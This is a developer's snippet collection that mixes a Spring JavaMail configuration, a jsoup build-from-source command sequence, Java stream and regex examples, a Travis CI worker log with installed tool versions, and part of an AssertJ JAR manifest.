    if (env.containsProperty("mail.smtp.starttls.enable")) {
        properties.setProperty("mail.smtp.starttls.enable",env.getProperty("mail.smtp.starttls.enable"));
    }
    return properties; 
} 


@Bean
public MailSender mailSender() throws Exception {
    JavaMailSenderImpl mailSender = new JavaMailSenderImpl();
    if (env.containsProperty("mail.server.host")) {
        mailSender.setHost(env.getProperty("mail.server.host"));
    } else {
        throw new Exception("Missing mail.server.host property");
    }
    if (env.containsProperty("mail.server.port")) {
        mailSender.setPort(Integer.parseInt(env.getProperty("mail.server.port")));
    } else {
        throw new Exception("Missing mail.server.port property");
    }
    if (env.containsProperty("mail.server.username")) {
        mailSender.setUsername(env.getProperty("mail.server.username"));
    } else {
        throw new Exception("Missing mail.server.username property");
    }
    if (env.containsProperty("mail.server.password")) {
        mailSender.setPassword(env.getProperty("mail.server.password"));
    } else {
        throw new Exception("Missing mail.server.password property");
    }
    mailSender.setJavaMailProperties(additionalMailProperties());
    return mailSender;
}

@Bean
public MailSendingMessageHandler mailSendingMessageHandler() throws Exception {
    MailSendingMessageHandler mailSendingMessageHandler = new MailSendingMessageHandler(mailSender());
    //mailSendingMessageHandler.setChannelResolver(channelResolver);
    return mailSendingMessageHandler;
}

/*    @Bean
public DirectChannel outboundMail() {
    DirectChannel outboundChannel = new DirectChannel();
    return outboundChannel;
}
*/    
@Bean
public MessageChannel smtpChannel() {
    return new DirectChannel();
}


/*    @Bean
@Value("${imap.url}")
public MailReceiver imapMailReceiver(String imapUrl) {
//      ImapMailReceiver imapMailReceiver = new ImapMailReceiver(imapUrl);
//      imapMailReceiver.setShouldMarkMessagesAsRead(true);
//      imapMailReceiver.setShouldDeleteMessages(false);
//      // other setters here
//      return imapMailReceiver;
    MailReceiver receiver = mock(MailReceiver.class);
    MailMessage message = mock(Message.class);
    when(message.toString()).thenReturn("Message from " + imapUrl);
    Message[] messages = new Message[] {message};
    try {
        when(receiver.receive()).thenReturn(messages);
    }
    catch (MessagingException e) {
        e.printStackTrace();
    }
    return receiver;
}*/
--------------------------------------------------------------------------------------------------------
curl -Lo jsoup.zip https://github.com/jhy/jsoup/archive/master.zip
unzip jsoup.zip
cd jsoup-master
mvn install
--------------------------------------------------------------------------------------------------------
String cleanedHTML = Jsoup.clean(strHTML, Whitelist.none());
String cleanedHTML = Jsoup.clean(strHTML, Whitelist.relaxed());
String str = Jsoup.clean(strHTML, Whitelist.none().addTags("div"));
--------------------------------------------------------------------------------------------------------
Collection< PublicationSession > wantedPublications = 
    effectiveDatePublicationMap.values() // Collection<List<PublicationSession>>
                               .stream() // Stream<List<PublicationSession>>
                               .flatMap(list->list.stream()) // Stream<PublicationSession>
                               .filter(pub -> PublicationStatus.valueOf(pub.getPublishStatus()) == PublicationStatus.COMPLETE)
                               .sorted(Comparator.comparing(PublicationSession::getCreateTime))
                               .collect(toMap(p -> p.getPublicationSession().getEffDateTime(), UnaryOperator.identity(), PICK_LATEST))
                               .values();
							   
List<String> destList = new ArrayList<>(Arrays.asList("foo"));
List<String> newList = Arrays.asList("0", "1", "2", "3", "4", "5");
newList.parallelStream()
       .collect(Collectors.toCollection(() -> destList));
System.out.println(destList);
--------------------------------------------------------------------------------------------------------
Worker information
hostname: 4c9e34bc-1fb8-4cd3-bf1b-6b2010d9e6d3@1.production-1-worker-org-gce-1hv2
version: v6.2.0 https://github.com/travis-ci/worker/tree/5e5476e01646095f48eec13196fdb3faf8f5cbf7
instance: travis-job-d0317f09-5637-4bd3-b60b-51bf4b72ad81 travis-ci-garnet-trusty-1512502259-986baf0 (via amqp)
startup: 6.871559117s
system_info
Build system information
Build language: java
Build group: stable
Build dist: trusty
Build id: 543259452
Job id: 543259454
Runtime kernel version: 4.4.0-101-generic
travis-build version: 9f4eb462c
Build image provisioning date and time
Tue Dec  5 19:58:13 UTC 2017
Operating System Details
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.5 LTS
Release:	14.04
Codename:	trusty
Cookbooks Version
7c2c6a6 https://github.com/travis-ci/travis-cookbooks/tree/7c2c6a6
git version
git version 2.15.1
bash version
GNU bash, version 4.3.11(1)-release (x86_64-pc-linux-gnu)
gcc version
gcc (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4
Copyright (C) 2013 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
docker version
Client:
 Version:      17.09.0-ce
 API version:  1.32
 Go version:   go1.8.3
 Git commit:   afdb6d4
 Built:        Tue Sep 26 22:42:38 2017
 OS/Arch:      linux/amd64
Server:
 Version:      17.09.0-ce
 API version:  1.32 (minimum version 1.12)
 Go version:   go1.8.3
 Git commit:   afdb6d4
 Built:        Tue Sep 26 22:41:20 2017
 OS/Arch:      linux/amd64
 Experimental: false
clang version
clang version 5.0.0 (tags/RELEASE_500/final)
Target: x86_64-unknown-linux-gnu
Thread model: posix
InstalledDir: /usr/local/clang-5.0.0/bin
jq version
jq-1.5
bats version
Bats 0.4.0
shellcheck version
0.4.6
shfmt version
v2.0.0
ccache version
ccache version 3.1.9
Copyright (C) 2002-2007 Andrew Tridgell
Copyright (C) 2009-2011 Joel Rosdahl
This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 3 of the License, or (at your option) any later
version.
cmake version
cmake version 3.9.2
CMake suite maintained and supported by Kitware (kitware.com/cmake).
heroku version
heroku-cli/6.14.39-addc925 (linux-x64) node-v9.2.0
imagemagick version
Version: ImageMagick 6.7.7-10 2017-07-31 Q16 http://www.imagemagick.org
md5deep version
4.2
mercurial version
Mercurial Distributed SCM (version 4.2.2)
(see https://mercurial-scm.org for more information)
Copyright (C) 2005-2017 Matt Mackall and others
This is free software; see the source for copying conditions. There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
mysql version
mysql  Ver 14.14 Distrib 5.6.33, for debian-linux-gnu (x86_64) using  EditLine wrapper
openssl version
OpenSSL 1.0.1f 6 Jan 2014
packer version
Packer v1.0.2
Your version of Packer is out of date! The latest version
is 1.1.2. You can update by downloading from www.packer.io
postgresql client version
psql (PostgreSQL) 9.6.6
ragel version
Ragel State Machine Compiler version 6.8 Feb 2013
Copyright (c) 2001-2009 by Adrian Thurston
subversion version
svn, version 1.8.8 (r1568071)
   compiled Aug 10 2017, 17:20:39 on x86_64-pc-linux-gnu
Copyright (C) 2013 The Apache Software Foundation.
This software consists of contributions made by many people;
see the NOTICE file for more information.
Subversion is open source software, see http://subversion.apache.org/
The following repository access (RA) modules are available:
* ra_svn : Module for accessing a repository using the svn network protocol.
  - with Cyrus SASL authentication
  - handles 'svn' scheme
* ra_local : Module for accessing a repository on local disk.
  - handles 'file' scheme
* ra_serf : Module for accessing a repository via WebDAV protocol using serf.
  - using serf 1.3.3
  - handles 'http' scheme
  - handles 'https' scheme
sudo version
Sudo version 1.8.9p5
Configure options: --prefix=/usr -v --with-all-insults --with-pam --with-fqdn --with-logging=syslog --with-logfac=authpriv --with-env-editor --with-editor=/usr/bin/editor --with-timeout=15 --with-password-timeout=0 --with-passprompt=[sudo] password for %p:  --without-lecture --with-tty-tickets --disable-root-mailer --enable-admin-flag --with-sendmail=/usr/sbin/sendmail --with-timedir=/var/lib/sudo --mandir=/usr/share/man --libexecdir=/usr/lib/sudo --with-sssd --with-sssd-lib=/usr/lib/x86_64-linux-gnu --with-selinux
Sudoers policy plugin version 1.8.9p5
Sudoers file grammar version 43
Sudoers path: /etc/sudoers
Authentication methods: 'pam'
Syslog facility if syslog is being used for logging: authpriv
Syslog priority to use when user authenticates successfully: notice
Syslog priority to use when user authenticates unsuccessfully: alert
Send mail if the user is not in sudoers
Use a separate timestamp for each user/tty combo
Lecture user the first time they run sudo
Root may run sudo
Allow some information gathering to give useful error messages
Require fully-qualified hostnames in the sudoers file
Visudo will honor the EDITOR environment variable
Set the LOGNAME and USER environment variables
Length at which to wrap log file lines (0 for no wrap): 80
Authentication timestamp timeout: 15.0 minutes
Password prompt timeout: 0.0 minutes
Number of tries to enter a password: 3
Umask to use or 0777 to use user's: 022
Path to mail program: /usr/sbin/sendmail
Flags for mail program: -t
Address to send mail to: root
Subject line for mail messages: *** SECURITY information for %h ***
Incorrect password message: Sorry, try again.
Path to authentication timestamp dir: /var/lib/sudo
Default password prompt: [sudo] password for %p: 
Default user to run commands as: root
Value to override user's $PATH with: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
Path to the editor for use by visudo: /usr/bin/editor
When to require a password for 'list' pseudocommand: any
When to require a password for 'verify' pseudocommand: all
File descriptors >= 3 will be closed before executing a command
Environment variables to check for sanity:
	TZ
	TERM
	LINGUAS
	LC_*
	LANGUAGE
	LANG
	COLORTERM
Environment variables to remove:
	RUBYOPT
	RUBYLIB
	PYTHONUSERBASE
	PYTHONINSPECT
	PYTHONPATH
	PYTHONHOME
	TMPPREFIX
	ZDOTDIR
	READNULLCMD
	NULLCMD
	FPATH
	PERL5DB
	PERL5OPT
	PERL5LIB
	PERLLIB
	PERLIO_DEBUG 
	JAVA_TOOL_OPTIONS
	SHELLOPTS
	GLOBIGNORE
	PS4
	BASH_ENV
	ENV
	TERMCAP
	TERMPATH
	TERMINFO_DIRS
	TERMINFO
	_RLD*
	LD_*
	PATH_LOCALE
	NLSPATH
	HOSTALIASES
	RES_OPTIONS
	LOCALDOMAIN
	CDPATH
	IFS
Environment variables to preserve:
	JAVA_HOME
	TRAVIS
	CI
	DEBIAN_FRONTEND
	XAUTHORIZATION
	XAUTHORITY
	PS2
	PS1
	PATH
	LS_COLORS
	KRB5CCNAME
	HOSTNAME
	HOME
	DISPLAY
	COLORS
Locale to use while parsing sudoers: C
Directory in which to store input/output logs: /var/log/sudo-io
File in which to store the input/output log: %{seq}
Add an entry to the utmp/utmpx file when allocating a pty
PAM service name to use
PAM service name to use for login shells
Create a new PAM session for the command to run in
Maximum I/O log sequence number: 0
Local IP address and netmask pairs:
	10.240.0.28/255.255.255.255
	172.17.0.1/255.255.0.0
Sudoers I/O plugin version 1.8.9p5
gzip version
gzip 1.6
Copyright (C) 2007, 2010, 2011 Free Software Foundation, Inc.
Copyright (C) 1993 Jean-loup Gailly.
This is free software.  You may redistribute copies of it under the terms of
the GNU General Public License <http://www.gnu.org/licenses/gpl.html>.
There is NO WARRANTY, to the extent permitted by law.
Written by Jean-loup Gailly.
zip version
Copyright (c) 1990-2008 Info-ZIP - Type 'zip "-L"' for software license.
This is Zip 3.0 (July 5th 2008), by Info-ZIP.
Currently maintained by E. Gordon.  Please send bug reports to
the authors using the web page at www.info-zip.org; see README for details.
Latest sources and executables are at ftp://ftp.info-zip.org/pub/infozip,
as of above date; see http://www.info-zip.org/ for other sites.
Compiled with gcc 4.8.2 for Unix (Linux ELF) on Oct 21 2013.
Zip special compilation options:
	USE_EF_UT_TIME       (store Universal Time)
	BZIP2_SUPPORT        (bzip2 library version 1.0.6, 6-Sept-2010)
	    bzip2 code and library copyright (c) Julian R Seward
	    (See the bzip2 license for terms of use)
	SYMLINK_SUPPORT      (symbolic links supported)
	LARGE_FILE_SUPPORT   (can read and write large files on file system)
	ZIP64_SUPPORT        (use Zip64 to store large files in archives)
	UNICODE_SUPPORT      (store and read UTF-8 Unicode paths)
	STORE_UNIX_UIDs_GIDs (store UID/GID sizes/values using new extra field)
	UIDGID_NOT_16BIT     (old Unix 16-bit UID/GID extra field not used)
	[encryption, version 2.91 of 05 Jan 2007] (modified for Zip 3)
Encryption notice:
	The encryption code of this program is not copyrighted and is
	put in the public domain.  It was originally written in Europe
	and, to the best of our knowledge, can be freely distributed
	in both source and object forms from any country, including
	the USA under License Exception TSU of the U.S. Export
	Administration Regulations (section 740.13(e)) of 6 June 2002.
Zip environment options:
             ZIP:  [none]
          ZIPOPT:  [none]
vim version
VIM - Vi IMproved 7.4 (2013 Aug 10, compiled Nov 24 2016 16:43:18)
Included patches: 1-52
Extra patches: 8.0.0056
Modified by pkg-vim-maintainers@lists.alioth.debian.org
Compiled by buildd@
Huge version without GUI.  Features included (+) or not (-):
+acl             +farsi           +mouse_netterm   +syntax
+arabic          +file_in_path    +mouse_sgr       +tag_binary
+autocmd         +find_in_path    -mouse_sysmouse  +tag_old_static
-balloon_eval    +float           +mouse_urxvt     -tag_any_white
-browse          +folding         +mouse_xterm     -tcl
++builtin_terms  -footer          +multi_byte      +terminfo
+byte_offset     +fork()          +multi_lang      +termresponse
+cindent         +gettext         -mzscheme        +textobjects
-clientserver    -hangul_input    +netbeans_intg   +title
-clipboard       +iconv           +path_extra      -toolbar
+cmdline_compl   +insert_expand   -perl            +user_commands
+cmdline_hist    +jumplist        +persistent_undo +vertsplit
+cmdline_info    +keymap          +postscript      +virtualedit
+comments        +langmap         +printer         +visual
+conceal         +libcall         +profile         +visualextra
+cryptv          +linebreak       +python          +viminfo
+cscope          +lispindent      -python3         +vreplace
+cursorbind      +listcmds        +quickfix        +wildignore
+cursorshape     +localmap        +reltime         +wildmenu
+dialog_con      -lua             +rightleft       +windows
+diff            +menu            -ruby            +writebackup
+digraphs        +mksession       +scrollbind      -X11
-dnd             +modify_fname    +signs           -xfontset
-ebcdic          +mouse           +smartindent     -xim
+emacs_tags      -mouseshape      -sniff           -xsmp
+eval            +mouse_dec       +startuptime     -xterm_clipboard
+ex_extra        +mouse_gpm       +statusline      -xterm_save
+extra_search    -mouse_jsbterm   -sun_workshop    -xpm
   system vimrc file: "$VIM/vimrc"
     user vimrc file: "$HOME/.vimrc"
 2nd user vimrc file: "~/.vim/vimrc"
      user exrc file: "$HOME/.exrc"
  fall-back for $VIM: "/usr/share/vim"
Compilation: gcc -c -I. -Iproto -DHAVE_CONFIG_H     -g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=1      
Linking: gcc   -Wl,-Bsymbolic-functions -Wl,-z,relro -Wl,--as-needed -o vim        -lm -ltinfo -lnsl  -lselinux  -lacl -lattr -lgpm -ldl    -L/usr/lib/python2.7/config-x86_64-linux-gnu -lpython2.7 -lpthread -ldl -lutil -lm -Xlinker -export-dynamic -Wl,-O1 -Wl,-Bsymbolic-functions      
iptables version
iptables v1.4.21
curl version
curl 7.35.0 (x86_64-pc-linux-gnu) libcurl/7.35.0 OpenSSL/1.0.1f zlib/1.2.8 libidn/1.28 librtmp/2.3
wget version
GNU Wget 1.15 built on linux-gnu.
rsync version
rsync  version 3.1.0  protocol version 31
gimme version
v1.2.0
nvm version
0.33.6
perlbrew version
/home/travis/perl5/perlbrew/bin/perlbrew  - App::perlbrew/0.80
phpenv version
rbenv 1.1.1-25-g6aa70b6
rvm version
rvm 1.29.3 (latest) by Michal Papis, Piotr Kuczynski, Wayne E. Seguin [https://rvm.io]
default ruby version
ruby 2.4.1p111 (2017-03-22 revision 58053) [x86_64-linux]
CouchDB version
couchdb 1.6.1
ElasticSearch version
5.5.0
Installed Firefox version
firefox 56.0.2
MongoDB version
MongoDB 3.4.10
PhantomJS version
2.1.1
Pre-installed PostgreSQL versions
9.2.24
9.3.20
9.4.15
9.5.10
9.6.6
RabbitMQ Version
3.6.14
Redis version
redis-server 4.0.6
riak version
2.2.3
Pre-installed Go versions
1.7.4
ant version
Apache Ant(TM) version 1.9.3 compiled on April 8 2014
mvn version
Apache Maven 3.5.2 (138edd61fd100ec658bfa2d307c43b76940a5d7d; 2017-10-18T07:58:13Z)
Maven home: /usr/local/maven-3.5.2
Java version: 1.8.0_151, vendor: Oracle Corporation
Java home: /usr/lib/jvm/java-8-oracle/jre
Default locale: en_US, platform encoding: UTF-8
OS name: "linux", version: "4.4.0-98-generic", arch: "amd64", family: "unix"
gradle version
------------------------------------------------------------
Gradle 4.0.1
------------------------------------------------------------
Build time:   2017-07-07 14:02:41 UTC
Revision:     38e5dc0f772daecca1d2681885d3d85414eb6826
Groovy:       2.4.11
Ant:          Apache Ant(TM) version 1.9.6 compiled on June 29 2015
JVM:          1.8.0_151 (Oracle Corporation 25.151-b12)
OS:           Linux 4.4.0-98-generic amd64
lein version
Leiningen 2.8.1 on Java 1.8.0_151 Java HotSpot(TM) 64-Bit Server VM
Pre-installed Node.js versions
v4.8.6
v6.12.0
v6.12.1
v8.9
v8.9.1
phpenv versions
  system
  5.6
* 5.6.32 (set by /home/travis/.phpenv/version)
  7.0
  7.0.25
  7.1
  7.1.11
  hhvm
  hhvm-stable
composer --version
Composer version 1.5.2 2017-09-11 16:59:25
Pre-installed Ruby versions
ruby-2.2.7
ruby-2.3.4
ruby-2.4.1
docker_mtu
docker stop/waiting
docker start/running, process 4483
resolvconf
resolvconf stop/waiting
resolvconf start/running
Installing openjdk11
$ export JAVA_HOME=~/openjdk11
$ export PATH="$JAVA_HOME/bin:$PATH"
$ ~/bin/install-jdk.sh --target "/home/travis/openjdk11" --workspace "/home/travis/.cache/install-jdk" --feature "11" --license "GPL" --cacerts
install-jdk.sh 2019-05-02
The command "~/bin/install-jdk.sh --target "/home/travis/openjdk11" --workspace "/home/travis/.cache/install-jdk" --feature "11" --license "GPL" --cacerts" failed and exited with 7 during .
Your build has been stopped.
--------------------------------------------------------------------------------------------------------
Line 1
Line 2
Line 3
Line 4
This expression --- is contained in this line 5
Line 6
Line 7
Line 8
WORD begins that line 9
Line 10
Line 11
Line 12

\A(?s).*?WORD(?-s).*\R
\A(?s).*WORD(?-s).*\R
(?s).*?WORD(?-s).*\R
(?s).*WORD(?-s).*\R
(?s-i).*\R\K.*WORD.*

(?<=Name\s).*(?=\sAge)
\A(?s)(.*?)\K(WORD)

    Count((?-s)^.{N,}) give all lines containing, at least, N character(s)
    Count ((?-s)^.{M,N}$) give all lines containing, between M and N character(s)
    Count ((?-s)^.{1,N}$) give all lines containing, at most, N characters(s)
--------------------------------------------------------------------------------------------------------
C[] cs = (C[]) new Object[as.length];
Arrays.setAll(cs, i -> op.apply(as[i], bs[i]));

C[] cs = (C[])IntStream.range(0, as.length)
                       .mapToObj(i -> op.apply(as[i], bs[i]))
                       .toArray();
--------------------------------------------------------------------------------------------------------
String[] stringArray = stringStream.toArray(String[]::new);
--------------------------------------------------------------------------------------------------------
Manifest-Version: 1.0
Build-Jdk: 1.8.0_161
Built-By: joel
Bundle-Description: Rich and fluent assertions for testing for Java
Bundle-DocURL: joel-costigliola.github.io/assertj/index.html
Bundle-License: http://www.apache.org/licenses/LICENSE-2.0.txt
Bundle-ManifestVersion: 2
Bundle-Name: AssertJ fluent assertions
Bundle-RequiredExecutionEnvironment: JavaSE-1.8
Bundle-SymbolicName: org.assertj.core
Bundle-Vendor: AssertJ
Bundle-Version: 3.9.1
Created-By: Apache Maven Bundle Plugin
Export-Package: org.assertj.core.api;version="3.9.1";uses:="org.assertj.
 core.api.filter,org.assertj.core.api.iterable,org.assertj.core.conditio
 n,org.assertj.core.data,org.assertj.core.description,org.assertj.core.e
 rror,org.assertj.core.groups,org.assertj.core.internal,org.assertj.core
 .internal.bytebuddy.implementation.bind.annotation,org.assertj.core.pre
 sentation",org.assertj.core.api.exception;version="3.9.1",org.assertj.c
 ore.api.filter;version="3.9.1";uses:="org.assertj.core.api",org.assertj
 .core.api.iterable;version="3.9.1",org.assertj.core.condition;version="
 3.9.1";uses:="org.assertj.core.api",org.assertj.core.configuration;vers
 ion="3.9.1";uses:="org.assertj.core.presentation",org.assertj.core.data
 ;version="3.9.1",org.assertj.core.description;version="3.9.1",org.asser
 tj.core.error;version="3.9.1";uses:="org.assertj.core.api,org.assertj.c
 ore.data,org.assertj.core.description,org.assertj.core.groups,org.asser
 tj.core.internal,org.assertj.core.presentation,org.assertj.core.util.di
 ff",org.assertj.core.error.future;version="3.9.1";uses:="org.assertj.co
 re.error",org.assertj.core.error.uri;version="3.9.1";uses:="org.assertj
 .core.error",org.assertj.core.extractor;version="3.9.1";uses:="org.asse
 rtj.core.api.iterable,org.assertj.core.groups",org.assertj.core.groups;
 version="3.9.1";uses:="org.assertj.core.api.iterable",org.assertj.core.
 internal;uses:="org.assertj.core.api,org.assertj.core.data,org.assertj.
 core.error,org.assertj.core.presentation,org.assertj.core.util.diff";ve
 rsion="3.9.1",org.assertj.core.internal.bytebuddy;uses:="org.assertj.co
 re.internal.bytebuddy.description.method,org.assertj.core.internal.byte
 buddy.description.type,org.assertj.core.internal.bytebuddy.dynamic,org.
 assertj.core.internal.bytebuddy.dynamic.scaffold,org.assertj.core.inter
 nal.bytebuddy.dynamic.scaffold.inline,org.assertj.core.internal.bytebud
 dy.dynamic.scaffold.subclass,org.assertj.core.internal.bytebuddy.implem
 entation,org.assertj.core.internal.bytebuddy.implementation.attribute,o
 rg.assertj.core.internal.bytebuddy.implementation.auxiliary,org.assertj
 .core.internal.bytebuddy.implementation.bytecode,org.assertj.core.inter
 nal.bytebuddy.jar.asm,org.assertj.core.internal.bytebuddy.matcher";vers
 ion="3.9.1",org.assertj.core.internal.bytebuddy.agent.builder;uses:="or
 g.assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy.a
 sm,org.assertj.core.internal.bytebuddy.build,org.assertj.core.internal.
 bytebuddy.description.field,org.assertj.core.internal.bytebuddy.descrip
 tion.method,org.assertj.core.internal.bytebuddy.description.type,org.as
 sertj.core.internal.bytebuddy.dynamic,org.assertj.core.internal.bytebud
 dy.dynamic.loading,org.assertj.core.internal.bytebuddy.dynamic.scaffold
 ,org.assertj.core.internal.bytebuddy.dynamic.scaffold.inline,org.assert
 j.core.internal.bytebuddy.implementation,org.assertj.core.internal.byte
 buddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.imple
 mentation.bytecode.assign,org.assertj.core.internal.bytebuddy.jar.asm,o
 rg.assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal.by
 tebuddy.pool,org.assertj.core.internal.bytebuddy.utility";version="3.9.
 1",org.assertj.core.internal.bytebuddy.asm;uses:="org.assertj.core.inte
 rnal.bytebuddy,org.assertj.core.internal.bytebuddy.description,org.asse
 rtj.core.internal.bytebuddy.description.annotation,org.assertj.core.int
 ernal.bytebuddy.description.enumeration,org.assertj.core.internal.byteb
 uddy.description.field,org.assertj.core.internal.bytebuddy.description.
 method,org.assertj.core.internal.bytebuddy.description.modifier,org.ass
 ertj.core.internal.bytebuddy.description.type,org.assertj.core.internal
 .bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic.scaffold
 ,org.assertj.core.internal.bytebuddy.implementation,org.assertj.core.in
 ternal.bytebuddy.implementation.bytecode,org.assertj.core.internal.byte
 buddy.implementation.bytecode.assign,org.assertj.core.internal.bytebudd
 y.jar.asm,org.assertj.core.internal.bytebuddy.matcher,org.assertj.core.
 internal.bytebuddy.pool,org.assertj.core.internal.bytebuddy.utility.vis
 itor";version="3.9.1",org.assertj.core.internal.bytebuddy.build;uses:="
 org.assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy
 .description.type,org.assertj.core.internal.bytebuddy.dynamic,org.asser
 tj.core.internal.bytebuddy.dynamic.scaffold.inline,org.assertj.core.int
 ernal.bytebuddy.matcher";version="3.9.1",org.assertj.core.internal.byte
 buddy.description;uses:="org.assertj.core.internal.bytebuddy.descriptio
 n.annotation,org.assertj.core.internal.bytebuddy.description.method,org
 .assertj.core.internal.bytebuddy.description.modifier,org.assertj.core.
 internal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy
 .matcher";version="3.9.1",org.assertj.core.internal.bytebuddy.descripti
 on.annotation;uses:="org.assertj.core.internal.bytebuddy.description.en
 umeration,org.assertj.core.internal.bytebuddy.description.method,org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.matcher";version="3.9.1",org.assertj.core.internal.bytebudd
 y.description.enumeration;uses:="org.assertj.core.internal.bytebuddy.de
 scription,org.assertj.core.internal.bytebuddy.description.type";version
 ="3.9.1",org.assertj.core.internal.bytebuddy.description.field;uses:="o
 rg.assertj.core.internal.bytebuddy.description,org.assertj.core.interna
 l.bytebuddy.description.annotation,org.assertj.core.internal.bytebuddy.
 description.type,org.assertj.core.internal.bytebuddy.matcher";version="
 3.9.1",org.assertj.core.internal.bytebuddy.description.method;uses:="or
 g.assertj.core.internal.bytebuddy.description,org.assertj.core.internal
 .bytebuddy.description.annotation,org.assertj.core.internal.bytebuddy.d
 escription.modifier,org.assertj.core.internal.bytebuddy.description.typ
 e,org.assertj.core.internal.bytebuddy.matcher";version="3.9.1",org.asse
 rtj.core.internal.bytebuddy.description.modifier;version="3.9.1",org.as
 sertj.core.internal.bytebuddy.description.type;uses:="org.assertj.core.
 internal.bytebuddy.description,org.assertj.core.internal.bytebuddy.desc
 ription.annotation,org.assertj.core.internal.bytebuddy.description.fiel
 d,org.assertj.core.internal.bytebuddy.description.method,org.assertj.co
 re.internal.bytebuddy.implementation.bytecode,org.assertj.core.internal
 .bytebuddy.jar.asm.signature,org.assertj.core.internal.bytebuddy.matche
 r";version="3.9.1",org.assertj.core.internal.bytebuddy.dynamic;uses:="o
 rg.assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy.
 asm,org.assertj.core.internal.bytebuddy.description,org.assertj.core.in
 ternal.bytebuddy.description.annotation,org.assertj.core.internal.byteb
 uddy.description.field,org.assertj.core.internal.bytebuddy.description.
 method,org.assertj.core.internal.bytebuddy.description.modifier,org.ass
 ertj.core.internal.bytebuddy.description.type,org.assertj.core.internal
 .bytebuddy.dynamic.loading,org.assertj.core.internal.bytebuddy.dynamic.
 scaffold,org.assertj.core.internal.bytebuddy.implementation,org.assertj
 .core.internal.bytebuddy.implementation.attribute,org.assertj.core.inte
 rnal.bytebuddy.implementation.auxiliary,org.assertj.core.internal.byteb
 uddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.jar.as
 m,org.assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal
 .bytebuddy.pool,org.assertj.core.internal.bytebuddy.utility";version="3
 .9.1",org.assertj.core.internal.bytebuddy.dynamic.loading;uses:="org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.matcher,org.ass
 ertj.core.internal.bytebuddy.utility";version="3.9.1",org.assertj.core.
 internal.bytebuddy.dynamic.scaffold;uses:="org.assertj.core.internal.by
 tebuddy,org.assertj.core.internal.bytebuddy.asm,org.assertj.core.intern
 al.bytebuddy.description.annotation,org.assertj.core.internal.bytebuddy
 .description.field,org.assertj.core.internal.bytebuddy.description.meth
 od,org.assertj.core.internal.bytebuddy.description.modifier,org.assertj
 .core.internal.bytebuddy.description.type,org.assertj.core.internal.byt
 ebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic.scaffold.inl
 ine,org.assertj.core.internal.bytebuddy.implementation,org.assertj.core
 .internal.bytebuddy.implementation.attribute,org.assertj.core.internal.
 bytebuddy.implementation.auxiliary,org.assertj.core.internal.bytebuddy.
 implementation.bytecode,org.assertj.core.internal.bytebuddy.jar.asm,org
 .assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal.byte
 buddy.pool";version="3.9.1",org.assertj.core.internal.bytebuddy.dynamic
 .scaffold.inline;uses:="org.assertj.core.internal.bytebuddy,org.assertj
 .core.internal.bytebuddy.asm,org.assertj.core.internal.bytebuddy.descri
 ption.annotation,org.assertj.core.internal.bytebuddy.description.method
 ,org.assertj.core.internal.bytebuddy.description.type,org.assertj.core.
 internal.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic.
 scaffold,org.assertj.core.internal.bytebuddy.implementation,org.assertj
 .core.internal.bytebuddy.implementation.attribute,org.assertj.core.inte
 rnal.bytebuddy.implementation.auxiliary,org.assertj.core.internal.byteb
 uddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.jar.as
 m,org.assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal
 .bytebuddy.pool";version="3.9.1",org.assertj.core.internal.bytebuddy.dy
 namic.scaffold.subclass;uses:="org.assertj.core.internal.bytebuddy,org.
 assertj.core.internal.bytebuddy.asm,org.assertj.core.internal.bytebuddy
 .description.method,org.assertj.core.internal.bytebuddy.description.typ
 e,org.assertj.core.internal.bytebuddy.dynamic,org.assertj.core.internal
 .bytebuddy.dynamic.scaffold,org.assertj.core.internal.bytebuddy.impleme
 ntation,org.assertj.core.internal.bytebuddy.implementation.attribute,or
 g.assertj.core.internal.bytebuddy.implementation.auxiliary,org.assertj.
 core.internal.bytebuddy.matcher,org.assertj.core.internal.bytebuddy.poo
 l";version="3.9.1",org.assertj.core.internal.bytebuddy.implementation;u
 ses:="org.assertj.core.internal.bytebuddy,org.assertj.core.internal.byt
 ebuddy.description.annotation,org.assertj.core.internal.bytebuddy.descr
 iption.enumeration,org.assertj.core.internal.bytebuddy.description.fiel
 d,org.assertj.core.internal.bytebuddy.description.method,org.assertj.co
 re.internal.bytebuddy.description.modifier,org.assertj.core.internal.by
 tebuddy.description.type,org.assertj.core.internal.bytebuddy.dynamic,or
 g.assertj.core.internal.bytebuddy.dynamic.scaffold,org.assertj.core.int
 ernal.bytebuddy.implementation.attribute,org.assertj.core.internal.byte
 buddy.implementation.auxiliary,org.assertj.core.internal.bytebuddy.impl
 ementation.bind,org.assertj.core.internal.bytebuddy.implementation.bind
 .annotation,org.assertj.core.internal.bytebuddy.implementation.bytecode
 ,org.assertj.core.internal.bytebuddy.implementation.bytecode.assign,org
 .assertj.core.internal.bytebuddy.jar.asm,org.assertj.core.internal.byte
 buddy.matcher,org.assertj.core.internal.bytebuddy.utility";version="3.9
 .1",org.assertj.core.internal.bytebuddy.implementation.attribute;uses:=
 "org.assertj.core.internal.bytebuddy.description.annotation,org.assertj
 .core.internal.bytebuddy.description.field,org.assertj.core.internal.by
